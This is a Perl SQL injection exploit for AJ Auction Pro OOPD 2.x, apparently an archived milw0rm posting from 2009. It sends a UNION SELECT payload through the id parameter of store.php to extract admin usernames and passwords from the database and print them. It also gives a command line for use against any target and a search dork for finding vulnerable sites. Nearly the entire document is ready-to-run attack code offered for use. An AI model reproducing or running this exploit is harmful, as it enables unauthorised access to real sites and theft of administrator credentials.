<html><head><title>AJ Auction Pro OOPD 2.x (store.php id) SQL Injection Exploit</title></head><pre>#!/usr/bin/perl

#********************************************************#
#                                                        #
# [o] AJ Auction Pro OOPD 2.x SQL Injection Exploit      #
#      Software : AJ Auction Pro OOPD 2.x                #
#      Vendor   : http://www.ajsquare.com/               #
#      Author   : NoGe                                   #
#      Contact  : noge[dot]code[at]gmail[dot]com         #
#      Blog     : http://evilc0de.blogspot.com           #
#                                                        #
# [o] Usage                                              #
#      root@noge:~# perl ajpro.pl www.target.com         #
#                                                        #
# [o] Dork                                               #
#      &quot;Powered By AJ Auction Pro&quot;                       #
#                                                        #
# [o] Greetz                                             #
#      MainHack BrotherHood [ http://mainhack.net ]      #
#      Vrs-hCk OoN_BoY Paman bL4Ck_3n91n3 Angela Zhang   #
#      H312Y yooogy mousekill }^-^{ loqsa zxvf martfella #
#      skulmatic OLiBekaS ulga Cungkee k1tk4t str0ke     #
#                                                        #
#********************************************************#

use HTTP::Request;
use LWP::UserAgent;

my $target = $ARGV[0];
my $file_vuln = '/store.php?id=';
my $sql_query = '-null+union+select+1,2,3,4,5,group_concat(0x3a,user_name,0x3a,password,0x3a),7,8,9,10+from+admin--';
print &quot;\n[x]===============================================[x]\n&quot;;
print &quot;[x] AJ Auction Pro OOPD 2.x SQL Injection Exploit [x]\n&quot;;
print &quot;[x]                [C]oded By NoGe                [x]\n&quot;;
print &quot;[x]===============================================[x]\n\n&quot;;

my $exploit = &quot;http://&quot;.$target.$file_vuln.$sql_query;

my $request   = HTTP::Request-&gt;new(GET=&gt;$exploit);
my $useragent = LWP::UserAgent-&gt;new();
$useragent-&gt;timeout(10);
my $response  = $useragent-&gt;request($request);
if ($response-&gt;is_success) {
my $res   = $response-&gt;content;
if ($res =~ m/:(.*):(.*):/g) {
my ($username,$password) = ($1,$2);
print &quot;[+] $username:$password \n\n&quot;;
}
else { print &quot;[-] Error, Fail to get admin login.\n\n&quot;; }
}
else { print &quot;[-] Error, &quot;.$response-&gt;status_line.&quot;\n\n&quot;; }

# milw0rm.com [2009-08-18]</pre></html>